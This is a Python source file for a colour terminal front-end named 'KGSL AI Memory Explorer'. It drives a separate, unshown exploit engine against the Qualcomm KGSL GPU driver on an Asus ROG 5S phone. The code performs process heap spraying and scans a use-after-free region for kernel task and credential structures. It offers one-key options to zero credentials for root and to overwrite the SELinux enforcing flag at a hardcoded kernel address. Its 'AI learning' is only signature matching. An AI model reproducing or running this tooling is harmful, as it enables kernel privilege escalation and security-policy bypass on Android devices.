#!/usr/bin/env python3
"""
KGSL AI Memory Explorer - ROG 5S Optimized
Live TUI with ANSI colors, background learning, Ctrl+P cancel, spray logging.
"""

import os
import sys
import time
import struct
import subprocess
import threading
import json
import select
import termios
import tty
import datetime
import fcntl
import ctypes

# ============== ANSI COLORS ==============
class C:
    RST   = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    RED   = "\033[91m"
    GRN   = "\033[92m"
    YEL   = "\033[93m"
    BLU   = "\033[94m"
    MAG   = "\033[95m"
    CYN   = "\033[96m"
    WHT   = "\033[97m"
    GRY   = "\033[90m"
    BG_BLK= "\033[40m"
    INV   = "\033[7m"
    CLR   = "\033[2J\033[H"  # clear + cursor home
    HIDE  = "\033[?25l"
    SHOW  = "\033[?25h"

# Particle animation frames (used in header / status to show liveness)
PARTICLES = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
SPRAY_PARTICLES = ["◐","◓","◑","◒"]

# ============== EXPLORER ==============
class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.spray_procs = []
        self.spray_log = []  # detailed log of every spray
        self.exploit_proc = None
        self.kb_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "knowledge_base.json")
        self.log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "explorer_log.jsonl")
        self.knowledge_base = self.load_kb()

        # Live status state (updated by background threads)
        self.live = {
            "ram": 0.0,
            "status": "IDLE",
            "ai_patterns": self.knowledge_base.get("hit_count", 0),
            "last_msg": "Engine Ready.",
            "scan_offset": 0,
            "scan_total": 0,
            "spray_count": 0,
            "spray_target": 0,
            "kill_count": 0,
            "engine_pid": 0,
            "uptime_start": time.time(),
            "last_command": "—",
            "particle_idx": 0,
            "spray_pulse": 0,
            "last_spray_ts": 0.0,
            "sprays_per_sec": 0.0,
        }

        # Command history (for Up/Down rewind)
        self.cmd_history = []
        self.cmd_hist_idx = 0
        self.last_cmd_text = ""

        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.engine_path = os.path.join(base_dir, "kgsl_engine")

        self.uaf_start = 0x7001ff000
        self.scan_size  = 0x2000000

        # Cancel flag for background operations
        self.cancel_flag = threading.Event()
        self.bg_thread = None
        self.bg_lock = threading.Lock()

        # Heuristics
        self.system_apps = {
            "com.android.settings": "System Settings (Developer Mode)",
            "com.android.systemui": "System UI (Status Bar/Home)",
            "com.android.camera": "Camera Driver Context",
            "com.android.gallery3d": "Gallery/Media Provider",
            "com.android.deskclock": "System Clock/Alarms",
            "com.android.contacts": "Contacts/Phonebook",
            "com.google.android.gms": "Google Play Services",
            "com.asus.launcher": "ASUS Launcher",
            "android.uid.system": "System UID Context (UID 1000)",
        }
        self.kernel_structures = {
            b"KETO0422": "task_struct (Active Process Marker)",
            b"init_cred": "Kernel Root Credentials (Global)",
            b"selinux_enforcing": "SELinux Status Bit",
            b"\x7f" + b"ELF": "Kernel Executable Header (Base)",
            b"\xFD\x7B\xBF\xA9": "AArch64 Function Prologue (Code)",
        }
        self.offsets = {"pid": 0x548, "comm": 0x718, "cred": 0x770, "real_cred": 0x768, "tasks": 0x3f0}

        # Start live updater
        self._stop_live = threading.Event()
        threading.Thread(target=self._live_updater, daemon=True).start()

    # ============== KNOWLEDGE BASE ==============
    def load_kb(self):
        if os.path.exists(self.kb_path):
            try:
                with open(self.kb_path, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return {"successful_vas": [], "hit_count": 0, "ranges": []}

    def save_kb(self):
        with open(self.kb_path, 'w') as f:
            json.dump(self.knowledge_base, f, indent=4)

    # ============== LOGGING ==============
    def log_event(self, event_type, data):
        """Append event to global JSONL log. Called by spray + scan + patch."""
        entry = {
            "ts": datetime.datetime.now().isoformat(),
            "type": event_type,
            **data,
        }
        try:
            with open(self.log_path, 'a') as f:
                f.write(json.dumps(entry) + "\n")
        except Exception:
            pass
        # mirror short events in spray_log
        if event_type in ("spray", "kill", "scan_match", "patch"):
            self.spray_log.append(entry)

    # ============== AI CLASSIFIER ==============
    def classify_page(self, page_data, va):
        for pkg, name in self.system_apps.items():
            if pkg.encode() in page_data:
                return {"type": "System App", "description": name, "va": hex(va),
                        "confidence": 1.0, "data": page_data}
        for sig, name in self.kernel_structures.items():
            if sig in page_data:
                if hex(va) not in self.knowledge_base["successful_vas"]:
                    self.knowledge_base["successful_vas"].append(hex(va))
                    self.knowledge_base["hit_count"] += 1
                    self.save_kb()
                return {"type": "Kernel Core", "description": name, "va": hex(va),
                        "confidence": 0.95, "data": page_data}
        uid_pattern = struct.pack("<IIII", 10237, 10237, 10237, 10237)
        if uid_pattern in page_data:
            return {"type": "Privilege Struct", "description": "CRED for UID 10237",
                    "va": hex(va), "confidence": 0.85, "data": page_data}
        sys_uid = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if sys_uid in page_data:
            return {"type": "Privilege Struct", "description": "System UID (1000)",
                    "va": hex(va), "confidence": 0.8, "data": page_data}
        if b"\x00\x00\x00\x94" in page_data:
            return {"type": "Kernel Code", "description": "Executable AArch64 Segment",
                    "va": hex(va), "confidence": 0.6, "data": page_data}
        return {"type": "Unknown Object", "description": "Unclassified Data Fragment",
                "va": hex(va), "confidence": 0.1, "data": page_data}

    def translate_logic(self, item):
        data = item['data']
        desc = item['description']
        if "task_struct" in desc or b"KETO" in data:
            try:
                pid = struct.unpack("<I", data[self.offsets["pid"]:self.offsets["pid"]+4])[0]
                comm = data[self.offsets["comm"]:self.offsets["comm"]+16].split(b"\x00")[0].decode(errors='ignore')
            except Exception:
                pid, comm = 0, "unknown"
            return f"Process Descriptor for '{comm}' (PID {pid})"
        if "SELinux" in desc:
            return "Global SELinux configuration bit."
        if "Settings" in desc:
            return "Android Settings process memory."
        if "CRED" in desc:
            return "Credential structure. Holds UID/GID. Target for Root."
        return "Generic data buffer."

    # ============== LIVE UPDATER ==============
    def _live_updater(self):
        last_spray_count = 0
        last_t = time.time()
        while not self._stop_live.is_set():
            now = time.time()
            self.live["ram"] = self.get_ram_usage()
            self.live["ai_patterns"] = self.knowledge_base.get("hit_count", 0)
            if self.exploit_proc and self.exploit_proc.poll() is None:
                self.live["status"] = "EXPLOIT ACTIVE"
                self.live["engine_pid"] = self.exploit_proc.pid
            else:
                self.live["status"] = "IDLE"
                self.live["engine_pid"] = 0

            # Particle index for animation
            self.live["particle_idx"] = (self.live["particle_idx"] + 1) % len(PARTICLES)
            # Spray pulse: rate of sprays per second
            if self.live["spray_count"] != last_spray_count:
                dt = max(0.001, now - last_t)
                self.live["sprays_per_sec"] = (self.live["spray_count"] - last_spray_count) / dt
                last_spray_count = self.live["spray_count"]
                self.live["last_spray_ts"] = now
                self.live["spray_pulse"] = (self.live["spray_pulse"] + 1) % 8
                last_t = now

            time.sleep(0.2)

    # ============== TUI ==============
    def render_tui(self, hint=""):
        out = []
        L = self.live
        up = int(time.time() - L["uptime_start"])
        m, s = divmod(up, 60)
        h, m = divmod(m, 60)

        # Header with particle animation
        particle = PARTICLES[L["particle_idx"]]
        spray_p  = SPRAY_PARTICLES[L["spray_pulse"]]
        out.append(f"{C.BG_BLK}{C.CYN}{C.BOLD} {particle} KGSL AI MEMORY EXPLORER  v3.1  {C.RST}"
                   f"{C.GRY} │ {C.WHT}Asus ROG 5S  {C.GRY}│{C.RST}"
                   f" Up {C.GRN}{h:02d}:{m:02d}:{s:02d}{C.RST}  {C.GRY}│{C.RST}  "
                   f"{C.MAG}{spray_p}{C.RST}")

        # Live status — split into two visual lines for clarity
        ram_color = C.GRN if L["ram"] < 50 else (C.YEL if L["ram"] < 75 else C.RED)
        st_color  = C.GRN if "ACTIVE" in L["status"] else C.GRY
        out.append(f" {C.BOLD}STATUS{C.RST}: {st_color}{L['status']:<14}{C.RST}"
                   f" {C.GRY}│{C.RST} {C.BOLD}RAM{C.RST}: {ram_color}{L['ram']:5.1f}%{C.RST}"
                   f" {C.GRY}│{C.RST} {C.BOLD}AI LEARNING{C.RST}: {C.MAG}{L['ai_patterns']:>4}{C.RST} patterns"
                   f" {C.GRY}│{C.RST} {C.BOLD}ENGINE{C.RST}: {C.CYN}{L['engine_pid']:>6}{C.RST}"
                   f" {C.GRY}│{C.RST} {C.BOLD}SPRAY/s{C.RST}: {C.YEL}{L['sprays_per_sec']:5.1f}{C.RST}")

        # Last message (continuously updated online)
        out.append(f" {C.BOLD}LAST MSG{C.RST}: {C.YEL}{L['last_msg'][:70]}{C.RST}")

        # Live scan/spray progress bars
        if L["scan_total"] > 0 or L["spray_target"] > 0:
            if L["spray_target"] > 0:
                pct = min(100, 100 * L["spray_count"] // max(1, L["spray_target"]))
                bar = self._bar(pct, 32, C.CYN)
                out.append(f" {C.BOLD}SPRAY {C.RST}{spray_p} {bar} {pct:3d}%  "
                           f"({L['spray_count']}/{L['spray_target']})  "
                           f"{C.GRY}kills:{L['kill_count']}{C.RST}")
            if L["scan_total"] > 0:
                pct = min(100, 100 * L["scan_offset"] // max(1, L["scan_total"]))
                bar = self._bar(pct, 32, C.YEL)
                out.append(f" {C.BOLD}SCAN  {C.RST}  {bar} {pct:3d}%  "
                           f"({L['scan_offset']:#x}/{L['scan_total']:#x})")

        out.append(f"{C.GRY}{'─'*92}{C.RST}")

        # Found items (file manager)
        out.append(f" {C.BOLD}{C.WHT}[FILE MANAGER VIEW] — Found Memory Offsets  "
                   f"{C.GRY}({len(self.found_items)} total){C.RST}")
        out.append(f"{C.GRY}{'─'*92}{C.RST}")
        if not self.found_items:
            out.append(f" {C.GRY}(No items yet — press {C.WHT}[E]{C.GRY} to exploit, "
                       f"{C.WHT}[L]{C.GRY} to learn, {C.WHT}[S]{C.GRY} to scan){C.RST}")
        else:
            display = self.found_items[-12:]
            for i, item in enumerate(display):
                idx = len(self.found_items) - len(display) + i
                color = {"Kernel Core": C.RED, "Privilege Struct": C.YEL,
                         "System App": C.BLU, "Kernel Code": C.MAG}.get(item['type'], C.GRY)
                out.append(f" {C.GRY}└──{C.RST} {C.BOLD}{color}[{idx:02d}]{C.RST} "
                           f"{color}{item['type']:<18}{C.RST} │ "
                           f"{C.WHT}{item['description'][:40]:<40}{C.RST} │ "
                           f"{C.CYN}{item['va']}{C.RST}")

        out.append(f"{C.GRY}{'─'*92}{C.RST}")

        # Color-coded menu (E, L, S = GREEN 1st/2nd/3rd; C, R, B, Q, ID = BLUE neutral)
        out.append(
            f" {C.GRN}[E]{C.RST} Exploit Trigger   "
            f"{C.GRN}[L]{C.RST} AI Learning Loop  "
            f"{C.GRN}[S]{C.RST} Start AI Scan     "
            f"{C.BLU}[C]{C.RST} Clear Memory"
        )
        out.append(
            f" {C.BLU}[R]{C.RST} Verify Root       "
            f"{C.BLU}[B]{C.RST} Rebuild Engine    "
            f"{C.BLU}[Q]{C.RST} Exit Explorer     "
            f"{C.BLU}[ID]{C.RST} Open File"
        )
        out.append(f"{C.GRY}{'─'*92}{C.RST}")

        # Spray log activity (recent 3 lines)
        if self.spray_log:
            out.append(f" {C.BOLD}{C.MAG}LIVE LOG STREAM{C.RST} {C.GRY}(last 3){C.RST}")
            for e in self.spray_log[-3:]:
                et = e.get("type", "?")
                if et == "spray":
                    out.append(f"  {C.CYN}▸{C.RST} SPRAY  pid={C.WHT}{e.get('pid',0):<6}{C.RST} "
                               f"name={C.YEL}{e.get('name','?'):<14}{C.RST} "
                               f"batch={C.GRY}{e.get('batch',0)}{C.RST}")
                elif et == "kill":
                    out.append(f"  {C.RED}✗{C.RST} KILL   pid={C.WHT}{e.get('pid',0)}{C.RST}")
                elif et == "scan_match":
                    out.append(f"  {C.GRN}✓{C.RST} MATCH  va={C.CYN}{hex(e.get('va',0)):<14}{C.RST} "
                               f"type={C.MAG}{e.get('type','?')}{C.RST}")
                elif et == "patch":
                    out.append(f"  {C.YEL}⚡{C.RST} PATCH  va={C.CYN}{e.get('va','?')}{C.RST} "
                               f"val={e.get('val','?')} → {e.get('result','?')}")
            out.append(f"{C.GRY}{'─'*92}{C.RST}")

        # Hint + last command (rewind hint)
        if hint:
            out.append(f" {C.MAG}HINT{C.RST}: {C.WHT}{hint}{C.RST}")
        out.append(f" {C.GRY}LAST CMD{C.RST}: {C.CYN}{L['last_command']}{C.RST}    "
                   f"{C.GRY}(↑/↓ history, Ctrl+E rewind, Ctrl+P stop 'L', 'log' to dump){C.RST}")

        # Render atomically
        sys.stdout.write(C.CLR + "\n".join(out) + "\n")
        sys.stdout.flush()

    def _bar(self, pct, width, color):
        filled = int(width * pct / 100)
        return f"{C.GRY}[{color}{'█' * filled}{'░' * (width - filled)}{C.GRY}]{C.RST}"

    # ============== ENGINE MANAGEMENT ==============
    def ensure_engine(self):
        if self.exploit_proc:
            if self.exploit_proc.poll() is None:
                return True
            else:
                try:
                    err = self.exploit_proc.stderr.read().decode()
                except Exception:
                    err = ""
                self.live["last_msg"] = f"Engine died: {err.strip()[:80]}"
                self.log_event("engine_died", {"code": self.exploit_proc.returncode, "err": err})
                self.exploit_proc = None

        # Check format / missing
        if os.path.exists(self.engine_path):
            try:
                with open(self.engine_path, "rb") as f:
                    head = f.read(4)
                if head[:4] != b"\x7fELF":
                    self.try_compile_engine()
            except Exception:
                self.try_compile_engine()
        else:
            self.try_compile_engine()

        try:
            self.exploit_proc = subprocess.Popen(
                [self.engine_path],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, text=False, bufsize=0,
            )
            self.live["last_msg"] = f"Engine started (pid={self.exploit_proc.pid})"
            self.log_event("engine_start", {"pid": self.exploit_proc.pid})
            return True
        except Exception as e:
            self.live["last_msg"] = f"Engine start failed: {e}"
            return False

    def try_compile_engine(self):
        src = self.engine_path + ".c"
        if not os.path.exists(src):
            return False
        for comp in ("gcc", "clang"):
            try:
                subprocess.check_call([comp, "-O2", src, "-o", self.engine_path, "-lpthread"])
                return True
            except Exception:
                continue
        return False

    def _read_data_packet(self):
        if not self.ensure_engine():
            return None
        try:
            line = self.exploit_proc.stdout.readline().decode().strip()
            if not line.startswith("DATA:"):
                return None
            _, va_s, size_s = line.split(":")
            va = int(va_s, 16)
            size = int(size_s)
            data = self.exploit_proc.stdout.read(size)
            self.exploit_proc.stdout.readline()  # DATA_END
            return data
        except Exception as e:
            self.live["last_msg"] = f"Read packet error: {e}"
            self.log_event("engine_error", {"op": "read_packet", "err": str(e)})
            return None

    def _engine_alive(self):
        return self.exploit_proc is not None and self.exploit_proc.poll() is None

    def _engine_write(self, data):
        """Write to engine stdin, restarting it on BrokenPipe."""
        if not self.ensure_engine():
            return False
        try:
            self.exploit_proc.stdin.write(data)
            self.exploit_proc.stdin.flush()
            return True
        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            self.live["last_msg"] = f"Pipe broken: {e} — restarting engine"
            self.log_event("engine_pipe_broken", {"err": str(e)})
            self.exploit_proc = None
            if self.ensure_engine():
                try:
                    self.exploit_proc.stdin.write(data)
                    self.exploit_proc.stdin.flush()
                    return True
                except Exception as e2:
                    self.log_event("engine_restart_fail", {"err": str(e2)})
            return False

    def read_page(self, va):
        if not self._engine_write(f"read {hex(va)}\n".encode()):
            return None
        return self._read_data_packet()

    def patch_mem(self, va, val):
        if not self._engine_write(f"patch {hex(va)} {hex(val)}\n".encode()):
            return "Engine Error"
        try:
            line = self.exploit_proc.stdout.readline().decode().strip()
            self.log_event("patch", {"va": hex(va), "val": hex(val), "result": line})
            return line
        except Exception as e:
            return str(e)

    def get_ram_usage(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                avail  = int(lines[2].split()[1])
                return 100.0 * (1 - avail / total)
        except Exception:
            return 0.0

    # ============== ACTIONS ==============
    def trigger_exploit(self):
        self.live["last_command"] = "E (Exploit)"
        if not self._engine_write(b"exploit\n"):
            return "Engine Error"
        try:
            line = self.exploit_proc.stdout.readline().decode().strip()
            time.sleep(0.3)
            self.live["last_msg"] = f"Exploit: {line or 'No response'}"
            self.log_event("exploit", {"result": line})
            return line or "No response"
        except Exception as e:
            self.live["last_msg"] = f"Exploit read error: {e}"
            return f"Error: {e}"

    def cmd_clear(self):
        self.live["last_command"] = "C (Clear)"
        for pid in list(self.spray_procs):
            try:
                os.kill(pid, 9)
                os.waitpid(pid, 0)
            except Exception:
                pass
        self.spray_procs.clear()
        self.live["kill_count"] += 1
        self.live["last_msg"] = "Memory Cleared."
        return "Cleared"

    def cmd_rebuild(self):
        self.live["last_command"] = "B (Rebuild)"
        ok = self.try_compile_engine()
        if ok and self.exploit_proc:
            try:
                self.exploit_proc.stdin.write(b"quit\n")
                self.exploit_proc.terminate()
            except Exception:
                pass
            self.exploit_proc = None
        self.live["last_msg"] = "Engine Rebuilt." if ok else "Rebuild Failed."
        return "Rebuilt" if ok else "Failed"

    def cmd_verify_root(self):
        self.live["last_command"] = "R (Verify Root)"
        try:
            res = subprocess.check_output(["id"], text=True).strip()
        except Exception:
            res = "id failed"
        self.live["last_msg"] = res
        return res

    def cmd_scan(self):
        """Synchronous scan, but with live progress bar updates."""
        self.live["last_command"] = "S (Scan)"
        if not self.ensure_engine():
            return "Engine Error"
        # Prioritize known ranges
        for va_hex in list(self.knowledge_base["successful_vas"])[:8]:
            va = int(va_hex, 16)
            data = self.read_page(va)
            if data and not any(int(it['va'], 16) == va for it in self.found_items):
                self.found_items.append(self.classify_page(data, va))

        self.live["scan_total"] = self.scan_size
        self.live["scan_offset"] = 0
        if not self._engine_write(
            f"scan {hex(self.uaf_start)} {hex(self.uaf_start + self.scan_size)}\n".encode()):
            self.live["last_msg"] = "Scan: engine write failed"
            return "Error: engine write failed"
        try:
            while True:
                line = self.exploit_proc.stdout.readline().decode().strip()
                if not line:
                    break
                if "SCAN_DONE" in line:
                    break
                if "MATCH:" in line:
                    va = int(line.split(":")[1], 16)
                    self.live["scan_offset"] = va - self.uaf_start
                    data = self._read_data_packet()
                    if data and not any(int(it['va'], 16) == va for it in self.found_items):
                        self.found_items.append(self.classify_page(data, va))
                        self.log_event("scan_match", {"va": va, "type": self.found_items[-1]['type']})
            self.live["scan_offset"] = self.scan_size
            self.live["last_msg"] = f"Scan complete. Found {len(self.found_items)} items."
            return f"Found {len(self.found_items)} items."
        except Exception as e:
            self.live["last_msg"] = f"Scan error: {e}"
            self.log_event("scan_error", {"err": str(e)})
            return f"Error: {e}"

    # ============== BACKGROUND LEARNING (Ctrl+P to cancel) ==============
    def cmd_learning_start(self):
        """Launch AI learning in a background thread, controllable by Ctrl+P.
        Pressing L while learning is already running does nothing — only Ctrl+P cancels."""
        self.live["last_command"] = "L (Learning BG)"
        if self.bg_thread and self.bg_thread.is_alive():
            self.live["last_msg"] = "Learning already running — press Ctrl+P to cancel."
            return
        self.cancel_flag.clear()
        self.bg_thread = threading.Thread(target=self._learning_worker, daemon=True)
        self.bg_thread.start()
        self.live["last_msg"] = "Learning started. Press Ctrl+P to cancel."
        self.log_event("learning_start", {"total_target": 1000, "batch": 100})
        return "BG started"

    def _learning_worker(self):
        libc = ctypes.CDLL(None)
        PR_SET_NAME = 15
        target_total = 1000
        batch = 100
        done = 0
        self.live["spray_target"] = target_total
        self.live["spray_count"] = 0
        self.live["kill_count"] = 0

        while done < target_total and not self.cancel_flag.is_set():
            if not self.ensure_engine():
                time.sleep(1)
                continue

            batch_pids = []
            spray_batch_start = done
            for i in range(batch):
                if self.cancel_flag.is_set():
                    break
                try:
                    pid = os.fork()
                    if pid == 0:
                        try:
                            libc.prctl(PR_SET_NAME,
                                       f"KETO{(spray_batch_start + i) % 10000:04d}".encode(),
                                       0, 0, 0)
                        except Exception:
                            pass
                        while True:
                            time.sleep(60)
                    else:
                        batch_pids.append(pid)
                        self.spray_procs.append(pid)
                        # log spray
                        self.log_event("spray", {"pid": pid,
                                                  "name": f"KETO{(spray_batch_start+i) % 10000:04d}",
                                                  "batch": spray_batch_start // batch})
                        time.sleep(0.0005)
                except OSError as e:
                    self.log_event("spray_error", {"err": str(e)})
                    break
            self.live["spray_count"] += len(batch_pids)
            time.sleep(0.2)

            if not self.ensure_engine():
                continue

            if not self._engine_write(
                f"scan {hex(self.uaf_start)} {hex(self.uaf_start + self.scan_size)}\n".encode()):
                self.log_event("learning_scan_error", {"err": "engine write failed"})
                continue

            try:
                scan_done = False
                while not scan_done and not self.cancel_flag.is_set():
                    line = self.exploit_proc.stdout.readline().decode().strip()
                    if not line:
                        break
                    if "SCAN_DONE" in line:
                        scan_done = True
                        break
                    if "MATCH:" in line:
                        va = int(line.split(":")[1], 16)
                        self.live["scan_offset"] = va - self.uaf_start
                        data = self._read_data_packet()
                        if data and not any(int(it['va'], 16) == va for it in self.found_items):
                            with self.bg_lock:
                                self.found_items.append(self.classify_page(data, va))
                            self.log_event("scan_match", {"va": va,
                                                           "type": self.found_items[-1]['type']})
                if scan_done:
                    done += batch
                    self.live["spray_count"] = done
            except Exception as e:
                self.log_event("learning_scan_error", {"err": str(e)})

            # Kill
            for pid in batch_pids:
                try:
                    os.kill(pid, 9)
                    os.waitpid(pid, 0)
                except Exception:
                    pass
                self.live["kill_count"] += 1
                self.log_event("kill", {"pid": pid})
            time.sleep(0.05)

        self.live["spray_target"] = 0
        if self.cancel_flag.is_set():
            self.live["last_msg"] = f"Learning cancelled at {done}/{target_total}."
        else:
            self.live["last_msg"] = f"Learning complete. {done} processes."

    def cmd_learning_cancel(self):
        """Cancel running learning loop (Ctrl+P shortcut)."""
        self.cancel_flag.set()
        # Also kill live sprays
        for pid in list(self.spray_procs):
            try:
                os.kill(pid, 9)
                os.waitpid(pid, 0)
            except Exception:
                pass
            self.live["kill_count"] += 1
        self.spray_procs.clear()
        self.live["last_msg"] = "Learning cancelled by user."
        return "Cancelled"

    # ============== INPUT (with Ctrl+P detection) ==============
    def input_cmd(self):
        """Read one line, with history (Up/Down), Ctrl+P cancel, Ctrl+E rewind, Ctrl+C quit."""
        sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} ")
        sys.stdout.flush()
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            buf = []
            hist_idx = len(self.cmd_history)
            while True:
                ch = os.read(fd, 1)
                if not ch:
                    break
                c = ch.decode("utf-8", errors="ignore")
                if c == "\x03":  # Ctrl+C
                    buf = ["q"]
                    break
                if c == "\x10":  # Ctrl+P  -> cancel learning
                    self.cmd_learning_cancel()
                    self.live["last_msg"] = "Press 'L' to start a new learning cycle."
                    sys.stdout.write(f"\n{C.YEL}  [Ctrl+P] Learning cancelled. Press 'L' to restart.{C.RST}\n")
                    sys.stdout.flush()
                    continue
                if c in ("\r", "\n"):
                    sys.stdout.write("\n")
                    break
                if c == "\x7f" or c == "\b":
                    if buf:
                        buf.pop()
                        sys.stdout.write("\b \b")
                        sys.stdout.flush()
                    continue
                if c == "\x05":  # Ctrl+E -> rewind to last command
                    if self.last_cmd_text:
                        sys.stdout.write("\033[2K\r")
                        sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} {self.last_cmd_text}")
                        sys.stdout.flush()
                        buf = list(self.last_cmd_text)
                    continue
                if c == "\x1b":  # ESC sequence (arrow keys)
                    nxt = os.read(fd, 2)
                    if nxt == b"[A":  # Up arrow -> previous in history
                        if self.cmd_history and hist_idx > 0:
                            hist_idx -= 1
                            sys.stdout.write("\033[2K\r")
                            sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} {self.cmd_history[hist_idx]}")
                            sys.stdout.flush()
                            buf = list(self.cmd_history[hist_idx])
                    elif nxt == b"[B":  # Down arrow -> next in history
                        if self.cmd_history and hist_idx < len(self.cmd_history) - 1:
                            hist_idx += 1
                            sys.stdout.write("\033[2K\r")
                            sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} {self.cmd_history[hist_idx]}")
                            sys.stdout.flush()
                            buf = list(self.cmd_history[hist_idx])
                        elif self.cmd_history and hist_idx == len(self.cmd_history) - 1:
                            hist_idx += 1
                            sys.stdout.write("\033[2K\r")
                            sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} ")
                            sys.stdout.flush()
                            buf = []
                    continue
                buf.append(c)
                sys.stdout.write(c)
                sys.stdout.flush()
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
        cmd = "".join(buf).strip()
        if cmd:
            self.cmd_history.append(cmd)
            if len(self.cmd_history) > 100:
                self.cmd_history = self.cmd_history[-100:]
            self.last_cmd_text = cmd
        return cmd

    # ============== DETAIL VIEW ==============
    def show_detail(self, item_idx):
        if item_idx < 0 or item_idx >= len(self.found_items):
            return
        item = self.found_items[item_idx]
        data = item['data']
        sys.stdout.write(C.CLR)
        sys.stdout.write(f"{C.BOLD}=== FILE VIEW: {item['va']} ==={C.RST}\n")
        sys.stdout.write(f"Type: {item['type']} | Confidence: {item['confidence']*100:.1f}%\n")
        sys.stdout.write(f"AI Logic: {self.translate_logic(item)}\n")
        sys.stdout.write("─" * 75 + "\n")
        for i in range(0, min(len(data), 256), 16):
            chunk = data[i:i+16]
            hex_row = " ".join(f"{b:02X}" for b in chunk)
            printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
            sys.stdout.write(f" {i:04X} | {hex_row:<48} | {printable}\n")
        sys.stdout.write("─" * 75 + "\n")
        sys.stdout.write(f" [{C.GRN}K{C.RST}] Patch Root  [{C.GRN}S{C.RST}] Patch SELinux  "
                         f"[{C.GRN}Enter{C.RST}] Back\n")
        sys.stdout.flush()
        choice = self.input_cmd().lower()
        if choice == "k":
            r = self.patch_mem(int(item['va'], 16), 0)
            self.live["last_msg"] = f"Patch: {r}"
        elif choice == "s":
            r = self.patch_mem(0xffffffc002caa000, 0)
            self.live["last_msg"] = f"Patch SELinux: {r}"

    # ============== MAIN LOOP ==============
    def run(self):
        if not os.path.exists(self.engine_path):
            self.try_compile_engine()
        if not self.ensure_engine():
            sys.stdout.write(f"{C.RED}[CRIT] Could not start engine. Check GCC/Clang.{C.RST}\n")
            return

        while True:
            self.render_tui()
            try:
                cmd = self.input_cmd().lower()
            except (EOFError, KeyboardInterrupt):
                cmd = "q"

            if cmd in ("q", "quit", "exit"):
                self.cancel_flag.set()
                if self.exploit_proc:
                    try:
                        self.exploit_proc.stdin.write(b"quit\n")
                        self.exploit_proc.terminate()
                    except Exception:
                        pass
                for pid in list(self.spray_procs):
                    try:
                        os.kill(pid, 9)
                        os.waitpid(pid, 0)
                    except Exception:
                        pass
                break
            elif cmd in ("e", "exploit"):
                self.trigger_exploit()
            elif cmd in ("l", "learn"):
                self.cmd_learning_start()
            elif cmd in ("s", "scan"):
                self.cmd_scan()
            elif cmd in ("c", "clear"):
                self.cmd_clear()
            elif cmd in ("r", "root"):
                self.cmd_verify_root()
            elif cmd in ("b", "build"):
                self.cmd_rebuild()
            elif cmd in ("log", "logs"):
                # show last 20 spray log entries
                sys.stdout.write(C.CLR)
                sys.stdout.write(f"{C.BOLD}{C.CYN}=== SPRAY LOG (last 20) ==={C.RST}\n")
                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
                if not self.spray_log:
                    sys.stdout.write(f"{C.GRY}(empty — no sprays yet){C.RST}\n")
                else:
                    for e in self.spray_log[-20:]:
                        sys.stdout.write(json.dumps(e) + "\n")
                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
                sys.stdout.write(f"\n{C.GRY}Log file: {C.WHT}{self.log_path}{C.RST}\n")
                sys.stdout.write("Press Enter to return...")
                sys.stdout.flush()
                try:
                    self.input_cmd()
                except Exception:
                    pass
            elif cmd.isdigit():
                self.show_detail(int(cmd))
            elif cmd:
                self.live["last_msg"] = f"Unknown: {cmd}"


if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.run()
